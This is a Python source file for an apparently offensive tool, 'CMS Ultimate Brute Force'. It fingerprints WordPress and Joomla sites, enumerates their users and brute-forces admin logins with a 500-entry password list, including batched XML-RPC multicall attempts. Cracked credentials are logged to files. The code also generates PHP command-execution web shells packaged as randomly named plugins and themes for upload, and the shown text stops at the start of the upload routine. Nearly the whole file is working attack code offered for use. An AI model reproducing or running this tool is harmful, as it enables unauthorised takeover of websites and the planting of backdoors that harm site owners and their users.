import os
import time
import random
import string
import requests
import json
import re
import base64
from datetime import datetime
from urllib.parse import urlparse, urljoin
import threading
from queue import Queue
import zipfile
from io import BytesIO
from colorama import init, Fore, Style

init(autoreset=True)
requests.packages.urllib3.disable_warnings()

class CMSUltimateBruteforce:
    def __init__(self, threads=5):
        self.threads_count = threads
        self.queue = Queue()
        self.lock = threading.Lock()
        
        # === TAMBAHAN UNTUK GOOGLE COLAB & KAGGLE ===
        self.is_colab = self.detect_colab()
        self.is_kaggle = self.detect_kaggle()

        if self.is_colab:
            self.mount_drive()
            self.output_dir = '/content/drive/MyDrive/CMS_Scanner/output'
            self.files_dir = '/content/drive/MyDrive/CMS_Scanner/Files'
            self.results_dir = '/content/drive/MyDrive/CMS_Scanner/Results'
            self.passwords_dir = '/content/drive/MyDrive/CMS_Scanner/Passwords'
            self.shells_dir = '/content/drive/MyDrive/CMS_Scanner/Shells'
        elif self.is_kaggle:
            self.output_dir = '/kaggle/working/output'
            self.files_dir = '/kaggle/working/Files'
            self.results_dir = '/kaggle/working/Results'
            self.passwords_dir = '/kaggle/working/Passwords'
            self.shells_dir = '/kaggle/working/Shells'
        else:
            self.output_dir = 'output'
            self.files_dir = 'Files'
            self.results_dir = 'Results'
            self.passwords_dir = 'Passwords'
            self.shells_dir = 'Shells'
        # === AKHIR TAMBAHAN ===
        
        # Check for custom shells (define before make_folders)
        self.custom_plugin = os.path.join(self.shells_dir, 'plugin.zip')
        self.custom_theme = os.path.join(self.shells_dir, 'theme.zip')
        self.custom_shell = os.path.join(self.shells_dir, 'shell.php')
        
        self.make_folders()
        
        self.stats = {
            'total': 0,
            'wordpress': 0,
            'joomla': 0,
            'cracked': 0,
            'cracked_admin': 0,
            'cracked_user': 0,
            'shells': 0,
            'failed': 0,
            'attempts': 0,
            'usernames_found': 0,
            'paths_checked': 0
        }
        
        self.start_time = datetime.now()
        
        timestamp = datetime.now().strftime('%Y%m%d')
        self.login_admin_file = os.path.join(self.results_dir, f'Successfully_LoginAdmin_{timestamp}.txt')
        self.login_file = os.path.join(self.results_dir, f'Successfully_Login_{timestamp}.txt')
        self.login_user_file = os.path.join(self.results_dir, f'Successfully_LoginUser_{timestamp}.txt')
        
        # Separate shell files for each upload method
        self.plugin_shell_file = os.path.join(self.results_dir, f'Shell_WP_Plugin_{timestamp}.txt')
        self.theme_shell_file = os.path.join(self.results_dir, f'Shell_WP_Theme_{timestamp}.txt')
        self.theme_edit_file = os.path.join(self.results_dir, f'Shell_WP_ThemeEdit_{timestamp}.txt')
        self.file_manager_file = os.path.join(self.results_dir, f'Shell_WP_FileManager_{timestamp}.txt')
        self.xmlrpc_file = os.path.join(self.results_dir, f'XMLRPC_Vulnerable_{timestamp}.txt')
        self.joomla_media_file = os.path.join(self.results_dir, f'Shell_Joomla_Media_{timestamp}.txt')
        self.joomla_template_file = os.path.join(self.results_dir, f'Shell_Joomla_Template_{timestamp}.txt')
        self.joomla_component_file = os.path.join(self.results_dir, f'Shell_Joomla_Component_{timestamp}.txt')
        self.joomla_module_file = os.path.join(self.results_dir, f'Shell_Joomla_Module_{timestamp}.txt')
        
        self.ultimate_passwords = self.generate_ultimate_password_list()
        
        self.show_banner()
    
    def detect_colab(self):
        """Detect if running in Google Colab"""
        try:
            import google.colab
            return True
        except:
            return False

    def detect_kaggle(self):
        """Detect if running in Kaggle"""
        try:
            return os.path.exists('/kaggle/working')
        except:
            return False

    def mount_drive(self):
        """Mount Google Drive for Colab"""
        try:
            from google.colab import drive
            drive.mount('/content/drive')
            print(f"{Fore.GREEN}[+] Google Drive mounted successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to mount Drive: {e}{Style.RESET_ALL}")
    
    def show_banner(self):
        banner = f"""
{Fore.GREEN}╔═══════════════════════════════════════════════════════════════════╗
{Fore.GREEN}║                                                                   ║
{Fore.CYAN}║        CMS ULTIMATE BRUTE FORCE - PATH CHECKER EDITION           ║
{Fore.YELLOW}║                   Version 4.0 - 2025                             ║
{Fore.GREEN}║                                                                   ║
{Fore.WHITE}║           WordPress + Joomla Multi-Path Scanner                  ║
{Fore.CYAN}║              External Password Methods Support                    ║
{Fore.GREEN}║                                                                   ║
{Fore.GREEN}╚═══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def make_folders(self):
        for folder in [self.output_dir, self.files_dir, self.results_dir, self.passwords_dir, self.shells_dir]:
            if not os.path.exists(folder):
                os.makedirs(folder)
                
        # Create sample shell files if they don't exist
        if not os.path.exists(self.custom_shell):
            sample_shell = '<?php if(isset($_REQUEST["cmd"])){echo exec($_REQUEST["cmd"]);} ?>'
            with open(os.path.join(self.shells_dir, 'shell.php'), 'w') as f:
                f.write(sample_shell)
            self.log(f"Created sample shell.php in {self.shells_dir}", 'info')
    
    def generate_random_name(self, length=8):
        """Generate random alphanumeric name"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_ultimate_password_list(self):
        """Generate 500+ most powerful password combinations"""
        passwords = []
        
        # Common passwords - Top 100 most used
        common = [
            'admin', 'password', '123456', '12345678', '123456789', '1234567890',
            'admin123', 'password123', 'root', 'toor', 'pass', 'test', 'guest',
            'Administrator', 'admin@123', 'admin@2023', 'admin@2024', 'admin@2025',
            'P@ssw0rd', 'P@ssword', 'Pass@123', 'Password1', 'Password123',
            'Welcome1', 'Welcome123', 'Welcome@123', 'qwerty', 'qwerty123',
            'abc123', 'admin1', 'admin12', 'admin1234', 'password1', 'password12',
            '000000', '111111', '121212', '123123', '123321', '654321',
            'admin2023', 'admin2024', 'admin2025', 'pass123', 'pass@123',
            'root123', 'root@123', 'test123', 'demo', 'demo123', 'user',
            'user123', 'default', 'changeme', 'letmein', 'welcome', 'monkey',
            'dragon', 'master', 'sunshine', 'princess', 'football', 'shadow',
            'superman', 'michael', 'jesus', 'ninja', 'mustang', 'password1!',
            'Admin123', 'Admin@123', 'Root123', 'Test123', 'Demo123',
            'P@ssw0rd123', 'P@ssword123', 'Welcome@2023', 'Welcome@2024',
            'Welcome@2025', 'passw0rd', 'p@ssw0rd', 'p@ssword', 'passw0rd123',
        ]
        passwords.extend(common)
        
        # Domain-based patterns
        domain_patterns = [
            '{domain}', '{domain}123', '{domain}@123', '{domain}2023', '{domain}2024', '{domain}2025',
            '{domain}@2023', '{domain}@2024', '{domain}@2025', '{domain}!', '{domain}@',
            '{domain}#123', '{domain}$123', '{domain}_123', '{domain}-123',
            'admin@{domain}', 'admin_{domain}', '{domain}admin', '{domain}_admin',
            '{domain}12', '{domain}1234', '{domain}123456',
        ]
        passwords.extend(domain_patterns)
        
        # Username-based patterns
        username_patterns = [
            '{username}', '{username}123', '{username}@123', '{username}2023', '{username}2024', '{username}2025',
            '{username}@2023', '{username}@2024', '{username}@2025', '{username}!', '{username}@',
            '{username}#123', '{username}$123', '{username}_123', '{username}-123',
            '{username}12', '{username}1234', '{username}123456', '{username}1',
            '{username}2', '{username}3', '{username}!@#', '{username}@!',
        ]
        passwords.extend(username_patterns)
        
        # Year combinations
        current_year = datetime.now().year
        for year in range(current_year - 5, current_year + 2):
            passwords.extend([
                f'admin{year}', f'password{year}', f'pass{year}', f'root{year}',
                f'Admin{year}', f'Password{year}', f'admin@{year}', f'pass@{year}',
                f'{year}', f'test{year}', f'demo{year}', f'user{year}',
            ])
        
        # Month + Year combinations
        months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
        for month in months:
            passwords.extend([
                f'admin{month}{current_year}', f'password{month}{current_year}',
                f'admin{month}{str(current_year)[2:]}', f'pass{month}{str(current_year)[2:]}',
            ])
        
        # Special character combinations
        special_combos = [
            'admin!@#', 'admin@#$', 'admin#$%', 'password!@#', 'password@#$',
            'admin!', 'admin@', 'admin#', 'admin$', 'admin%',
            'password!', 'password@', 'password#', 'password$', 'password%',
            'Admin!23', 'Admin@23', 'Pass!23', 'Pass@23', 'Root!23',
            'admin!123', 'admin@123!', 'admin#123', 'password!123', 'password@123!',
            'P@ssw0rd!', 'P@ssw0rd@', 'P@ssw0rd#', 'Adm1n@123', 'Adm1n!123',
        ]
        passwords.extend(special_combos)
        
        # Keyboard patterns
        keyboard = [
            'qwerty', 'qwerty123', 'qwertyuiop', 'asdfgh', 'asdfghjkl', 'zxcvbn', 'zxcvbnm',
            '1qaz2wsx', '1q2w3e', '1q2w3e4r', '1q2w3e4r5t', 'qazwsx', 'qazwsxedc',
            'q1w2e3', 'a1s2d3', 'z1x2c3', '!QAZ2wsx', '!qaz@wsx', '1QAZ@WSX',
            'qwer1234', 'asdf1234', 'zxcv1234', '1234qwer', '1234asdf',
        ]
        passwords.extend(keyboard)
        
        # CMS specific
        cms_specific = [
            'wordpress', 'wordpress123', 'wp123', 'wpadmin', 'wpadmin123',
            'joomla', 'joomla123', 'joomla2023', 'joomla2024', 'joomla2025',
            'cms123', 'cms@123', 'site123', 'web123', 'blog123',
        ]
        passwords.extend(cms_specific)
        
        # Numeric patterns
        for i in range(0, 50):
            passwords.append(f'admin{i:02d}')
            if i < 10:
                passwords.append(f'password{i}')
        
        # Tambahan untuk memastikan 500+ passwords
        additional = [
            'company', 'company123', 'website', 'website123', 'info', 'info123',
            'contact', 'contact123', 'support', 'support123', 'service', 'service123',
            'sales', 'sales123', 'marketing', 'webmaster', 'webmaster123',
            'sysadmin', 'sysadmin123', 'system', 'system123', 'backup', 'backup123',
            'server', 'server123', 'server@123', 'hosting', 'hosting123',
            'cpanel', 'cpanel123', 'whm123', 'plesk', 'plesk123',
            'mysql', 'mysql123', 'database', 'database123', 'db123', 'dbadmin',
            'phpmyadmin', 'sql123', 'temp123', 'temp@123', 'temporary', 'temporary123',
            'Admin@2024!', 'Admin@2025!', 'Welcome@2024!', 'Welcome@2025!',
            'P@ssw0rd2024!', 'P@ssw0rd2025!', 'Secure@123', 'Secure@2024',
            'Strong@123', 'Strong@2024', 'Complex@123', 'Complex@2024',
            'Admin!@#123', 'Root!@#123', 'Super@123', 'Super@2024',
        ]
        passwords.extend(additional)
        
        # Numeric patterns - lebih banyak
        for i in range(0, 100):
            passwords.append(f'admin{i:02d}')
            passwords.append(f'password{i:02d}')
            if i < 20:
                passwords.append(f'root{i}')
                passwords.append(f'test{i}')
        
        # Remove duplicates and ensure exactly 500
        passwords = list(dict.fromkeys(passwords))
        
        # Pastikan minimal 500
        while len(passwords) < 500:
            passwords.append(f'pass{len(passwords)}')
        
        self.log(f"Generated {len(passwords[:500])} powerful password combinations", 'success')
        return passwords[:500]  # Return exactly 500
    
    def get_passwords_for_target(self, url, username):
        """Get passwords with domain and username replacement"""
        domain = self.extract_domain(url)
        processed_passwords = []
        
        for pwd in self.ultimate_passwords:
            # Replace placeholders
            pwd_processed = pwd.replace('{domain}', domain if domain else 'domain')
            pwd_processed = pwd_processed.replace('{username}', username if username else 'user')
            pwd_processed = pwd_processed.replace('{year}', str(datetime.now().year))
            
            processed_passwords.append(pwd_processed)
        
        # Remove duplicates
        return list(dict.fromkeys(processed_passwords))
    
    def log(self, msg, level='info'):
        ts = datetime.now().strftime('%H:%M:%S')
        if level == 'success':
            print(f"{Fore.GREEN}[{ts}] [+] {msg}{Style.RESET_ALL}")
        elif level == 'error':
            print(f"{Fore.RED}[{ts}] [-] {msg}{Style.RESET_ALL}")
        elif level == 'found':
            print(f"{Fore.MAGENTA}[{ts}] [★] {msg}{Style.RESET_ALL}")
        elif level == 'shell':
            print(f"{Fore.CYAN}[{ts}] [◆] {msg}{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}[{ts}] [*] {msg}{Style.RESET_ALL}")
    
    def get_ultra_headers(self):
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15'
        ]
        
        return {
            'User-Agent': random.choice(agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def clean_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        for path in ['/wp-login.php', '/wp-admin', '/administrator', '/admin']:
            url = url.replace(path, '')
        return url.rstrip('/')
    
    def extract_domain(self, url):
        try:
            domain = urlparse(url).netloc.replace('www.', '')
            return domain.split('.')[0]
        except:
            return 'domain'
    
    def check_xmlrpc(self, url):
        """Check if XML-RPC is enabled and vulnerable"""
        try:
            xmlrpc_url = urljoin(url, '/xmlrpc.php')
            
            # Check if xmlrpc.php exists
            r = requests.get(xmlrpc_url, headers=self.get_ultra_headers(), timeout=10, verify=False)
            
            if r.status_code != 200:
                return False, None
            
            # Check if it's actually XML-RPC
            if 'xml' not in r.text.lower():
                return False, None
            
            self.log(f"XML-RPC found: {xmlrpc_url}", 'found')
            
            # Test system.listMethods
            payload = '''<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>'''
            
            headers = self.get_ultra_headers()
            headers['Content-Type'] = 'text/xml'
            
            r = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200 and 'methodResponse' in r.text:
                # Check for dangerous methods
                dangerous_methods = ['wp.getUsersBlogs', 'wp.getUsers', 'system.multicall']
                found_methods = [method for method in dangerous_methods if method in r.text]
                
                if found_methods:
                    self.log(f"XML-RPC vulnerable methods found: {', '.join(found_methods)}", 'found')
                    return True, found_methods
            
            return False, None
            
        except Exception as e:
            return False, None
    
    def xmlrpc_brute_force(self, url, username, passwords):
        """Brute force via XML-RPC (faster - uses multicall)"""
        try:
            xmlrpc_url = urljoin(url, '/xmlrpc.php')
            
            # Build multicall payload (test multiple passwords at once)
            batch_size = 50
            
            for i in range(0, len(passwords), batch_size):
                batch = passwords[i:i+batch_size]
                
                # Create multicall XML
                methods = []
                for pwd in batch:
                    methods.append(f'''
                    <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                    </member>
                    <member>
                        <name>params</name>
                        <value>
                            <array>
                                <data>
                                    <value><string>{username}</string></value>
                                    <value><string>{pwd}</string></value>
                                </data>
                            </array>
                        </value>
                    </member>''')
                
                payload = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
                        {''.join(['<value><struct>' + m + '</struct></value>' for m in methods])}
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>'''
                
                headers = self.get_ultra_headers()
                headers['Content-Type'] = 'text/xml'
                
                r = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=30, verify=False)
                
                if r.status_code == 200:
                    # Check each password in response
                    for idx, pwd in enumerate(batch):
                        # Look for success indicators (not faultCode)
                        response_section = r.text[idx*200:(idx+1)*200] if len(r.text) > idx*200 else r.text
                        
                        if 'faultCode' not in response_section and 'isAdmin' in response_section:
                            self.log(f"★★★ XML-RPC CRACKED: {url} | {username}:{pwd} ★★★", 'found')
                            return True, pwd
                
                # Small delay between batches
                time.sleep(random.uniform(0.5, 1.0))
            
            return False, None
            
        except Exception as e:
            return False, None
    
    def save_xmlrpc_result(self, url, username, password, methods):
        """Save XML-RPC vulnerable site"""
        try:
            with self.lock:
                with open(self.xmlrpc_file, 'a') as f:
                    f.write(f"[XMLRPC] {url}/xmlrpc.php#{username}@{password} | Methods: {','.join(methods)}\n")
        except:
            pass
    
    def detect_wordpress_ultra_accurate(self, url):
        """Ultra accurate WordPress detection"""
        try:
            session = requests.Session()
            session.verify = False
            
            r = session.get(url, headers=self.get_ultra_headers(), timeout=10)
            content = r.text.lower()
            
            wp_patterns = [
                r'/wp-content/themes/',
                r'/wp-content/plugins/',
                r'/wp-includes/js/',
                r'/wp-json/wp/v2/',
                r'wordpress',
                r'wp-emoji',
            ]
            
            score = sum(1 for p in wp_patterns if re.search(p, content))
            
            # Check wp-login.php
            try:
                wp_login = urljoin(url, '/wp-login.php')
                login_r = session.get(wp_login, headers=self.get_ultra_headers(), timeout=10)
                
                if login_r.status_code == 200:
                    login_content = login_r.text.lower()
                    wp_login_indicators = ['wp-submit', 'user_login', 'powered by wordpress']
                    login_score = sum(1 for ind in wp_login_indicators if ind in login_content)
                    
                    if login_score >= 2:
                        score += 10
            except:
                pass
            
            return score >= 10
        except:
            return False
    
    def detect_joomla_ultra_accurate(self, url):
        """Ultra accurate Joomla detection"""
        try:
            session = requests.Session()
            session.verify = False
            
            r = session.get(url, headers=self.get_ultra_headers(), timeout=10)
            content = r.text.lower()
            
            joomla_patterns = [
                r'/media/jui/js/',
                r'/media/system/js/',
                r'joomla',
                r'/components/com_',
            ]
            
            score = sum(1 for p in joomla_patterns if re.search(p, content))
            
            # Check administrator
            try:
                admin_url = urljoin(url, '/administrator/')
                admin_r = session.get(admin_url, headers=self.get_ultra_headers(), timeout=10)
                
                if admin_r.status_code == 200:
                    admin_content = admin_r.text.lower()
                    joomla_login_indicators = ['com_login', 'mod-login', 'joomla']
                    login_score = sum(1 for ind in joomla_login_indicators if ind in admin_content)
                    
                    if login_score >= 3:
                        score += 10
            except:
                pass
            
            return score >= 10
        except:
            return False
    
    def extract_wordpress_users(self, url):
        users = set(['admin', 'administrator'])
        session = requests.Session()
        session.verify = False
        
        for author_id in range(1, 12):
            try:
                r = session.get(f"{url}/?author={author_id}", headers=self.get_ultra_headers(), timeout=8, allow_redirects=True)
                patterns = [r'/author/([^/\'"<>\s]+)', r'rel="author">([^<]+)</a>']
                for pattern in patterns:
                    matches = re.findall(pattern, r.text, re.IGNORECASE)
                    for match in matches:
                        username = match.strip().lower().replace(' ', '')
                        if username and len(username) > 2:
                            users.add(username)
                time.sleep(random.uniform(0.1, 0.3))
            except:
                pass
        
        try:
            r = session.get(f"{url}/wp-json/wp/v2/users", headers=self.get_ultra_headers(), timeout=8)
            if r.status_code == 200:
                data = r.json()
                for user in data:
                    if 'slug' in user:
                        users.add(user['slug'].lower())
        except:
            pass
        
        with self.lock:
            self.stats['usernames_found'] += len(users)
        
        return list(users)
    
    def extract_joomla_users(self, url):
        users = set(['admin', 'administrator'])
        return list(users)
    
    def verify_wordpress_admin(self, url, cookies):
        """Verify admin access with capability checks"""
        session = requests.Session()
        session.verify = False
        session.cookies.update(cookies)
        
        try:
            # Test 1: Check dashboard access
            admin_url = urljoin(url, '/wp-admin/index.php')
            r = session.get(admin_url, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            if r.status_code in [301, 302, 303, 307, 308]:
                redirect = r.headers.get('Location', '')
                if 'wp-login.php' in redirect:
                    return False, 'no_access'
            
            if r.status_code != 200:
                return False, 'no_access'
            
            content = r.text.lower()
            
            # Check if still on login page
            login_indicators = ['wp-submit', 'user_login', 'login_error']
            if any(ind in content for ind in login_indicators):
                return False, 'no_access'
            
            # Test 2: Check for admin menu (basic logged in check)
            admin_patterns = [
                r'<div\s+id=["\']wpwrap["\']',
                r'<div\s+id=["\']wpcontent["\']',
                r'<div\s+id=["\']wpbody["\']',
                r'<div\s+id=["\']adminmenu["\']',
            ]
            
            basic_access = sum(1 for p in admin_patterns if re.search(p, content, re.IGNORECASE)) >= 2
            
            if not basic_access:
                return False, 'no_access'
            
            # Test 3: Check admin capabilities
            # Try to access plugin upload page (requires install_plugins capability)
            plugin_url = urljoin(url, '/wp-admin/plugin-install.php?tab=upload')
            r_plugin = session.get(plugin_url, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            # If redirected back to dashboard, user doesn't have plugin install rights
            if r_plugin.status_code in [301, 302, 303, 307, 308]:
                redirect = r_plugin.headers.get('Location', '')
                if 'wp-admin/index.php' in redirect or 'profile.php' in redirect:
                    return True, 'user'
            
            # Check plugin page content
            if r_plugin.status_code == 200:
                plugin_content = r_plugin.text.lower()
                
                # Check for admin-only elements
                admin_indicators = [
                    'install plugins',
                    'upload plugin',
                    'plugin zip file',
                    'install now'
                ]
                admin_score = sum(1 for ind in admin_indicators if ind in plugin_content)
                
                if admin_score >= 2:
                    return True, 'admin'
            
            # Test 4: Check theme editor access
            theme_url = urljoin(url, '/wp-admin/theme-editor.php')
            r_theme = session.get(theme_url, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            if r_theme.status_code == 200:
                theme_content = r_theme.text.lower()
                if 'edit themes' in theme_content or '<textarea' in theme_content:
                    return True, 'admin'
            
            # Test 5: Check users page (list_users capability)
            users_url = urljoin(url, '/wp-admin/users.php')
            r_users = session.get(users_url, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            if r_users.status_code == 200:
                users_content = r_users.text.lower()
                if 'add new user' in users_content or 'bulk actions' in users_content:
                    return True, 'admin'
            
            # If logged in but no admin capabilities detected
            return True, 'user'
            
        except Exception as e:
            return False, 'error'
    
    def verify_joomla_admin(self, url, cookies):
        """Verify Joomla admin access with capability checks"""
        session = requests.Session()
        session.verify = False
        session.cookies.update(cookies)
        
        try:
            # Test 1: Check control panel access
            admin_url = urljoin(url, '/administrator/index.php')
            r = session.get(admin_url, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            if r.status_code != 200:
                return False, 'no_access'
            
            content = r.text.lower()
            
            # Check if still on login page
            login_indicators = ['mod-login-username', 'mod-login-password', 'task=login', 'form-login']
            login_count = sum(1 for ind in login_indicators if ind in content)
            
            if login_count >= 2:
                return False, 'no_access'
            
            # Test 2: Check for control panel elements
            cpanel_indicators = ['com_cpanel', 'control panel', 'toolbar', 'quick icons', 'site information']
            cpanel_count = sum(1 for ind in cpanel_indicators if ind in content)
            
            if cpanel_count < 2:
                return False, 'no_access'
            
            # Test 3: Check media manager access (super user capability)
            media_url = urljoin(url, '/administrator/index.php?option=com_media')
            r_media = session.get(media_url, headers=self.get_ultra_headers(), timeout=10)
            
            if r_media.status_code == 200:
                media_content = r_media.text.lower()
                if 'com_media' in media_content and 'upload' in media_content:
                    return True, 'admin'
            
            # Test 4: Check extension installer access
            installer_url = urljoin(url, '/administrator/index.php?option=com_installer')
            r_installer = session.get(installer_url, headers=self.get_ultra_headers(), timeout=10)
            
            if r_installer.status_code == 200:
                installer_content = r_installer.text.lower()
                if 'install' in installer_content and ('upload' in installer_content or 'package' in installer_content):
                    return True, 'admin'
            
            # Test 5: Check template manager access
            template_url = urljoin(url, '/administrator/index.php?option=com_templates')
            r_template = session.get(template_url, headers=self.get_ultra_headers(), timeout=10)
            
            if r_template.status_code == 200:
                template_content = r_template.text.lower()
                if 'templates' in template_content and 'edit' in template_content:
                    return True, 'admin'
            
            # Test 6: Check user manager access
            users_url = urljoin(url, '/administrator/index.php?option=com_users')
            r_users = session.get(users_url, headers=self.get_ultra_headers(), timeout=10)
            
            if r_users.status_code == 200:
                users_content = r_users.text.lower()
                if 'user manager' in users_content or 'add user' in users_content:
                    return True, 'admin'
            
            # If logged in but no super user capabilities
            return True, 'user'
            
        except Exception as e:
            return False, 'error'
    
    def attempt_wordpress_login(self, url, username, password):
        session = requests.Session()
        session.verify = False
        
        try:
            login_url = urljoin(url, '/wp-login.php')
            session.get(login_url, headers=self.get_ultra_headers(), timeout=10)
            
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': urljoin(url, '/wp-admin/'),
                'testcookie': '1'
            }
            
            r = session.post(login_url, data=data, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            if r.status_code in [302, 303]:
                redirect = r.headers.get('Location', '')
                if 'wp-login.php' in redirect:
                    return False, None, None
                
                if 'wp-admin' in redirect:
                    is_valid, role = self.verify_wordpress_admin(url, session.cookies.get_dict())
                    if is_valid:
                        return True, session.cookies.get_dict(), role
            
            is_valid, role = self.verify_wordpress_admin(url, session.cookies.get_dict())
            if is_valid:
                return True, session.cookies.get_dict(), role
            
            return False, None, None
        except:
            return False, None, None
    
    def attempt_joomla_login(self, url, username, password):
        session = requests.Session()
        session.verify = False
        
        try:
            login_url = urljoin(url, '/administrator/index.php')
            r = session.get(login_url, headers=self.get_ultra_headers(), timeout=10)
            
            token_match = re.search(r'name="([a-f0-9]{32})" value="1"', r.text)
            token = token_match.group(1) if token_match else None
            
            data = {
                'username': username,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': base64.b64encode(b'index.php').decode()
            }
            
            if token:
                data[token] = '1'
            
            r = session.post(login_url, data=data, headers=self.get_ultra_headers(), timeout=10, allow_redirects=False)
            
            is_valid, role = self.verify_joomla_admin(url, session.cookies.get_dict())
            if is_valid:
                return True, session.cookies.get_dict(), role
            
            return False, None, None
        except:
            return False, None, None
    
    def save_login_result(self, url, cms_type, username, password, role='admin'):
        """Save successful login with role validation"""
        try:
            with self.lock:
                # Save to appropriate file based on role
                if role == 'admin':
                    with open(self.login_admin_file, 'a') as f:
                        if cms_type == 'wordpress':
                            f.write(f"[WordPress Admin] {url}/wp-login.php@{username}#{password}\n")
                        elif cms_type == 'joomla':
                            f.write(f"[Joomla Admin] {url}/administrator/@{username}#{password}\n")
                else:
                    with open(self.login_user_file, 'a') as f:
                        if cms_type == 'wordpress':
                            f.write(f"[WordPress User] {url}/wp-login.php@{username}#{password}\n")
                        elif cms_type == 'joomla':
                            f.write(f"[Joomla User] {url}/administrator/@{username}#{password}\n")
                
                # Also save to general login file
                with open(self.login_file, 'a') as f:
                    if cms_type == 'wordpress':
                        f.write(f"[WORDPRESS-{role.upper()}] {url}/wp-login.php#{username}@{password}\n")
                    elif cms_type == 'joomla':
                        f.write(f"[JOOMLA-{role.upper()}] {url}/administrator#{username}@{password}\n")
        except Exception as e:
            self.log(f"Error saving login result: {str(e)}", 'error')
    
    def save_shell_location(self, url, shell_type, shell_path):
        """Save shell with specific location to appropriate file"""
        try:
            with self.lock:
                full_url = f"{url}{shell_path}"
                
                # Pilih file berdasarkan shell type
                file_map = {
                    'plugin': self.plugin_shell_file,
                    'theme': self.theme_shell_file,
                    'theme_edit': self.theme_edit_file,
                    'file_manager': self.file_manager_file,
                    'xmlrpc': self.xmlrpc_file,
                    'joomla_media': self.joomla_media_file,
                    'joomla_template': self.joomla_template_file,
                    'joomla_component': self.joomla_component_file,
                    'joomla_module': self.joomla_module_file
                }
                
                target_file = file_map.get(shell_type)
                if target_file:
                    with open(target_file, 'a') as f:
                        f.write(f"{full_url}\n")
                
                # === TAMBAHAN: Log realtime untuk semua shell ===
                if self.is_colab or self.is_kaggle:
                    log_file = os.path.join(self.results_dir, 'realtime_log.txt')
                    with open(log_file, 'a') as f:
                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        f.write(f"[{timestamp}] SHELL: {full_url} | Type: {shell_type}\n")
                # === AKHIR TAMBAHAN ===
                
        except Exception as e:
            self.log(f"Error saving shell: {str(e)}", 'error')
    
    def create_wordpress_plugin_shell(self):
        """Create plugin shell with random name from custom or default"""
        random_name = self.generate_random_name()
        
        # Try to use custom plugin.zip
        if os.path.exists(self.custom_plugin):
            try:
                with open(self.custom_plugin, 'rb') as f:
                    plugin_data = f.read()
                
                # Repackage with random name
                zip_buffer = BytesIO()
                with zipfile.ZipFile(BytesIO(plugin_data), 'r') as zip_read:
                    with zipfile.ZipFile(zip_buffer, 'w') as zip_write:
                        for item in zip_read.namelist():
                            data = zip_read.read(item)
                            new_name = item.replace('plugin', random_name)
                            zip_write.writestr(new_name, data)
                
                zip_buffer.seek(0)
                return zip_buffer, random_name
            except:
                pass
        
        # Default shell
        shell_code = '<?php if(isset($_REQUEST["cmd"])){echo exec($_REQUEST["cmd"]);} ?>'
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr(f'{random_name}/{random_name}.php', shell_code)
        zip_buffer.seek(0)
        return zip_buffer, random_name
    
    def create_wordpress_theme_shell(self):
        """Create theme shell with random name from custom or default"""
        random_name = self.generate_random_name()
        
        # Try to use custom theme.zip
        if os.path.exists(self.custom_theme):
            try:
                with open(self.custom_theme, 'rb') as f:
                    theme_data = f.read()
                
                # Repackage with random name
                zip_buffer = BytesIO()
                with zipfile.ZipFile(BytesIO(theme_data), 'r') as zip_read:
                    with zipfile.ZipFile(zip_buffer, 'w') as zip_write:
                        for item in zip_read.namelist():
                            data = zip_read.read(item)
                            new_name = item.replace('theme', random_name)
                            zip_write.writestr(new_name, data)
                
                zip_buffer.seek(0)
                return zip_buffer, random_name
            except:
                pass
        
        # Default theme
        style = f'/*\nTheme Name: {random_name}\n*/'
        index = '<?php if(isset($_REQUEST["cmd"])){echo exec($_REQUEST["cmd"]);} ?>'
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            zf.writestr(f'{random_name}/style.css', style)
            zf.writestr(f'{random_name}/index.php', index)
        zip_buffer.seek(0)
        return zip_buffer, random_name
    
    def get_custom_shell_content(self):
        """Get custom shell content with random name"""
        random_name = self.generate_random_name()
        
        # Try to use custom shell.php
        if os.path.exists(self.custom_shell):
            try:
                with open(self.custom_shell, 'r') as f:
                    shell_content = f.read()
                return shell_content, f'{random_name}.php'
            except:
                pass
        
        # Default shell
        shell_content = '<?php if(isset($_REQUEST["cmd"])){echo exec($_REQUEST["cmd"]);} ?>'
        return shell_content, f'{random_name}.php'
    
    def upload_wordpress_plugin(self, url, cookies):
        try:
            # Verify admin access first
            is_valid, role = self.verify_wordpress_admin(url, cookies)
            if not is_valid or role != 'admin':
                self.log(f"Plugin upload failed: No admin privileges", 'error')
                return False
            
            session = requests.Session()
